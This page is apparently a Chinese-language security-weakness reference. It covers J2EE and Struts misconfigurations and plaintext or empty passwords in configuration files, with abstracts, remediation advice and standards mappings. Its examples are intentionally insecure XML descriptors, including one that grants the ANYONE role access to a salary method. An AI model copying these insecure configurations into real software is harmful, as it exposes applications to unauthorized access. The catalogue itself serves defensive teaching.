<h4 id="J2EE-Misconfiguration-Missing-Servlet-Mapping"><a href="#J2EE-Misconfiguration-Missing-Servlet-Mapping" class="headerlink" title="J2EE Misconfiguration: Missing Servlet Mapping"></a>J2EE Misconfiguration: Missing Servlet Mapping</h4><h5 id="ABSTRACT-200"><a href="#ABSTRACT-200" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>web.xml 中定义的 Servlet 必须通过相应的 servlet 映射才能访问。</p>
<h5 id="EXPLANATION-201"><a href="#EXPLANATION-201" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>缺少有效的 servlet 映射会阻止用户对未映射的 servlet 的所有访问。</p>
<p>例 1： web.xml 中的以下条目定义了 ExampleServlet，但未定义相应的 servlet 映射。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;web-app xmlns=&quot;http://java.sun.com/xml/ns/j2ee&quot;</span><br><span class="line"></span><br><span class="line">    xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line"></span><br><span class="line">    xsi:schemaLocation=&quot;http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd&quot;</span><br><span class="line"></span><br><span class="line">    version=&quot;2.4&quot;&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    &lt;servlet&gt;</span><br><span class="line"></span><br><span class="line">      &lt;servlet-name&gt;ExampleServlet&lt;/servlet-name&gt;</span><br><span class="line"></span><br><span class="line">      &lt;servlet-class&gt;com.class.ExampleServlet&lt;/servlet-class&gt;</span><br><span class="line"></span><br><span class="line">      &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/servlet&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-200"><a href="#RECOMMENDATIONS-200" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>确保每个 <code>&lt;servlet&gt;</code> 都有相应的 <code>&lt;servlet-mapping&gt;</code>。</p>
<p>例 2： web.xml 中的以下条目定义了 ExampleServlet 及相应的 servlet 映射。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;web-app xmlns=&quot;http://java.sun.com/xml/ns/j2ee&quot;</span><br><span class="line"></span><br><span class="line">    xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line"></span><br><span class="line">    xsi:schemaLocation=&quot;http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd&quot;</span><br><span class="line"></span><br><span class="line">    version=&quot;2.4&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet&gt;</span><br><span class="line"></span><br><span class="line">        &lt;servlet-name&gt;ExampleServlet&lt;/servlet-name&gt;</span><br><span class="line"></span><br><span class="line">        &lt;servlet-class&gt;com.class.ExampleServlet&lt;/servlet-class&gt;</span><br><span class="line"></span><br><span class="line">        &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/servlet&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">        &lt;servlet-name&gt;ExampleServlet&lt;/servlet-name&gt;</span><br><span class="line"></span><br><span class="line">        &lt;url-pattern&gt;/exampleservlet&lt;/url-pattern&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    &lt;servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">        &lt;servlet-name&gt;action&lt;/servlet-name&gt;</span><br><span class="line"></span><br><span class="line">        &lt;url-pattern&gt;/action&lt;/url-pattern&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-199"><a href="#REFERENCES-199" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Sun Microsystems, Inc. Java Servlet Specification 2.4</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 730</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-5 Denial of Service Protection (P1)</p>
<p>[4] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[5] Standards Mapping - OWASP Top 10 2004 A9 Application Denial of Service</p>
<p>[6] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[7] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.9</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP6080 CAT II</p>
<p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP6080 CAT II</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP6080 CAT II</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP6080 CAT II</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP6080 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP6080 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP6080 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002400 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002400 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002400 CAT II</p>
<p>[19] Standards Mapping - Web Application Security Consortium 24 + 2 Denial of Service</p>
<p>[20] Standards Mapping - Web Application Security Consortium Version 2.00 Denial of Service (WASC-10)</p>
<h4 id="J2EE-Misconfiguration-Unsafe-Bean-Declaration"><a href="#J2EE-Misconfiguration-Unsafe-Bean-Declaration" class="headerlink" title="J2EE Misconfiguration: Unsafe Bean Declaration"></a>J2EE Misconfiguration: Unsafe Bean Declaration</h4><h5 id="ABSTRACT-201"><a href="#ABSTRACT-201" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>不应该从远程声明实体 bean。</p>
<h5 id="EXPLANATION-202"><a href="#EXPLANATION-202" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>暴露远程接口的实体 bean 可能会成为应用程序遭到攻击的突破口。出于性能方面的考虑，应用程序几乎不使用远程实体 bean。因此，很有可能会发生这样的情况：对远程实体 bean 的声明错误。</p>
<p>例 1：以下对实体 bean 的声明包含了一个远程接口：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;ejb-jar&gt;</span><br><span class="line"></span><br><span class="line">&lt;enterprise-beans&gt;</span><br><span class="line"></span><br><span class="line">&lt;entity&gt;</span><br><span class="line"></span><br><span class="line">&lt;ejb-name&gt;EmployeeRecord&lt;/ejb-name&gt;</span><br><span class="line"></span><br><span class="line">&lt;home&gt;com.wombat.empl.EmployeeRecordHome&lt;/home&gt;</span><br><span class="line"></span><br><span class="line">&lt;remote&gt;com.wombat.empl.EmployeeRecord&lt;/remote&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;/entity&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;/enterprise-beans&gt;</span><br><span class="line"></span><br><span class="line">&lt;/ejb-jar&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-201"><a href="#RECOMMENDATIONS-201" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>尽可能在本地调用实体 bean。如果无法在本地调用某个实体 bean，就应当研究一下远程 bean 对性能的影响，以及采取哪些措施来降低其他受攻击面所带来的风险。</p>
<h5 id="REFERENCES-200"><a href="#REFERENCES-200" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] A. Taylor et al. J2EE &amp; Java: Developing Secure Web Applications with Java Technology (Hacking Exposed) Osborne/McGraw-Hill</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 8</p>
<p>[3] Standards Mapping - FIPS200 AC</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-3 Access Enforcement (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A2 Broken Access Control</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A10 Failure to Restrict URL Access</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A8 Failure to Restrict URL Access</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.2, Requirement 7.2</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.10, Requirement 7.2</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8, Requirement 7.2</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8, Requirement 7.2</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8, Requirement 7.2</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8, Requirement 7.2</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3480.2 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3480.2 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3480.2 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3480.2 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3480.2 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3480.2 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3480.2 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-001870 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-001870 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-001870 CAT II</p>
<h4 id="J2EE-Misconfiguration-Weak-Access-Permissions"><a href="#J2EE-Misconfiguration-Weak-Access-Permissions" class="headerlink" title="J2EE Misconfiguration: Weak Access Permissions"></a>J2EE Misconfiguration: Weak Access Permissions</h4><h5 id="ABSTRACT-202"><a href="#ABSTRACT-202" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>不要将调用 EJB 方法的权限授予 ANYONE 这一角色。</p>
<h5 id="EXPLANATION-203"><a href="#EXPLANATION-203" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>如果 EJB 部署描述符包含一个或多个方法，并且这些方法被授予了特殊的 ANYONE 角色的访问权限，这表明编程人员没有全面考虑应用程序的 access control，或者应用程序的构造方式决定了不可能进行合理的 access control 限制。</p>
<p>例 1：以下部署描述符授权给了 ANYONE，允许其调用 Employee EJB 的 getSalary() 方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;ejb-jar&gt;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">	&lt;assembly-descriptor&gt;</span><br><span class="line"></span><br><span class="line">		&lt;method-permission&gt;</span><br><span class="line"></span><br><span class="line">			&lt;role-name&gt;ANYONE&lt;/role-name&gt;</span><br><span class="line"></span><br><span class="line">			&lt;method&gt;</span><br><span class="line"></span><br><span class="line">				&lt;ejb-name&gt;Employee&lt;/ejb-name&gt;</span><br><span class="line"></span><br><span class="line">				&lt;method-name&gt;getSalary&lt;/method-name&gt;</span><br><span class="line"></span><br><span class="line">		&lt;/method-permission&gt;</span><br><span class="line"></span><br><span class="line">	&lt;/assembly-descriptor&gt;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">&lt;/ejb-jar&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-202"><a href="#RECOMMENDATIONS-202" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>限制方法的调用权限，只允许最小的角色集访问它们所保护的 EJB 方法。您可能需要重新构造应用程序，以强制实施有效的 access control 限制。</p>
<h5 id="REFERENCES-201"><a href="#REFERENCES-201" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] A. Taylor et al. J2EE &amp; Java: Developing Secure Web Applications with Java Technology (Hacking Exposed) Osborne/McGraw-Hill</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 9</p>
<p>[3] Standards Mapping - FIPS200 AC</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-3 Access Enforcement (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M5 Poor Authorization and Authentication</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A2 Broken Access Control</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A10 Failure to Restrict URL Access</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A8 Failure to Restrict URL Access</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.2, Requirement 7.2</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.10, Requirement 7.2</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8, Requirement 7.2</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8, Requirement 7.2</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8, Requirement 7.2</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8, Requirement 7.2</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3480.2 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3480.2 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3480.2 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3480.2 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3480.2 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3480.2 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3480.2 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-001870 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-001870 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-001870 CAT II</p>
<p>[26] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[27] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15), Insufficient Authentication (WASC-01)</p>
<h4 id="Password-Management-Empty-Password-in-Configuration-File"><a href="#Password-Management-Empty-Password-in-Configuration-File" class="headerlink" title="Password Management: Empty Password in Configuration File"></a>Password Management: Empty Password in Configuration File</h4><h5 id="ABSTRACT-203"><a href="#ABSTRACT-203" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>使用空字符串作为密码是不安全的做法。</p>
<h5 id="EXPLANATION-204"><a href="#EXPLANATION-204" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在任何时候使用空字符串作为密码都是不恰当的。因为它太容易被猜中了。</p>
<h5 id="RECOMMENDATIONS-203"><a href="#RECOMMENDATIONS-203" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>必须使用非常难以猜测的密码来保护所有的帐户和系统资源。参照以下内容来帮助建立适当密码管理方针。</p>
<h5 id="REFERENCES-202"><a href="#REFERENCES-202" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Password Guidelines Microsoft</p>
<p>[2] J. Yan, A. Blackwell, R. Anderson, and A. Grant The memorability and security of passwords – some empirical results</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 258</p>
<p>[4] Standards Mapping - FIPS200 IA</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-28 Protection of Information at Rest (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M2 Insecure Data Storage</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage</p>
<p>[8] Standards Mapping - OWASP Top 10 2007 A8 Insecure Cryptographic Storage</p>
<p>[9] Standards Mapping - OWASP Top 10 2010 A7 Insecure Cryptographic Storage</p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.8, Requirement 8.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.4</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003270 CAT II, APSC-DV-003280 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003270 CAT II, APSC-DV-003280 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003270 CAT II, APSC-DV-003280 CAT I</p>
<p>[27] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[28] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Authentication (WASC-01)</p>
<h4 id="Password-Management-Password-in-Configuration-File"><a href="#Password-Management-Password-in-Configuration-File" class="headerlink" title="Password Management: Password in Configuration File"></a>Password Management: Password in Configuration File</h4><h5 id="ABSTRACT-204"><a href="#ABSTRACT-204" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>在配置文件中存储明文密码，可能会危及系统安全。</p>
<h5 id="EXPLANATION-205"><a href="#EXPLANATION-205" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在配置文件中存储明文密码会使所有能够访问该文件的人都能访问那些用密码保护的资源。程序员有时候认为，他们不可能阻止应用程序被那些能够访问配置文件的攻击者入侵，但是这种想法会导致攻击者发动攻击变得更加容易。健全的 password management 方针从来不会允许以明文形式存储密码。</p>
<h5 id="RECOMMENDATIONS-204"><a href="#RECOMMENDATIONS-204" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>绝不能采用明文的形式存储密码。相反，应在系统启动时，由管理员输入密码。如果这种方法不切实际，一个安全性较差、但通常都比较恰当的解决办法是将密码模糊化，并把这些去模糊化的资源分散到系统各处，因此，要破译密码，攻击者就必须取得并正确合并多个系统资源。</p>
<p>有些第三方产品宣称可以采用更加安全的方式管理密码。例如，WebSphere Application Server 4.x 用简单的异或加密算法加密数值，但是请不要对诸如此类的加密方式给予完全的信任。WebSphere 以及其他一些应用服务器通常都只提供过期的且相对较弱的加密机制，这对于安全性敏感的环境来说是远远不够的。较为安全的解决方法是由用户自己创建一个新机制，而这也是如今唯一可行的方法。</p>
<h5 id="REFERENCES-203"><a href="#REFERENCES-203" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 13, CWE ID 260, CWE ID 555</p>
<p>[2] Standards Mapping - FIPS200 IA</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-28 Protection of Information at Rest (P1)</p>
<p>[4] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M2 Insecure Data Storage</p>
<p>[5] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage</p>
<p>[6] Standards Mapping - OWASP Top 10 2007 A8 Insecure Cryptographic Storage</p>
<p>[7] Standards Mapping - OWASP Top 10 2010 A7 Insecure Cryptographic Storage</p>
<p>[8] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.8, Requirement 8.4</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003110 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003110 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II, APSC-DV-003110 CAT I</p>
<h4 id="Struts-Misconfiguration-Duplicate-Form-Bean"><a href="#Struts-Misconfiguration-Duplicate-Form-Bean" class="headerlink" title="Struts Misconfiguration: Duplicate Form Bean"></a>Struts Misconfiguration: Duplicate Form Bean</h4><h5 id="ABSTRACT-205"><a href="#ABSTRACT-205" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>存在使用相同名称的多个 form-bean 条目。重复的 form-bean 名称通常表示存在 Leftover Debug Code 或排字错误。</p>
<h5 id="EXPLANATION-206"><a href="#EXPLANATION-206" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>重复的 form-bean 名称毫无用处，因为当多个 <code>&lt;form-bean&gt;</code> 标签使用相同名称时，只会记录最后的条目。</p>
<p>例 1：以下配置包含具有相同名称的两个 form-bean 条目。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;form-beans&gt;</span><br><span class="line"></span><br><span class="line">  &lt;form-bean name=&quot;loginForm&quot; type=&quot;org.apache.struts.validator.DynaValidatorForm&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form-property name=&quot;name&quot; type=&quot;java.lang.String&quot; /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form-property name=&quot;password&quot; type=&quot;java.lang.String&quot; /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/form-bean&gt;</span><br><span class="line"></span><br><span class="line">  &lt;form-bean name=&quot;loginForm&quot; type=&quot;org.apache.struts.validator.DynaActionForm&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form-property name=&quot;favoriteColor&quot; type=&quot;java.lang.String&quot; /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/form-bean&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form-beans&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-205"><a href="#RECOMMENDATIONS-205" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>删除有具有相同名称的多余 form-bean 条目。 例 2：以下配置有两种不同的 form-bean。</p>
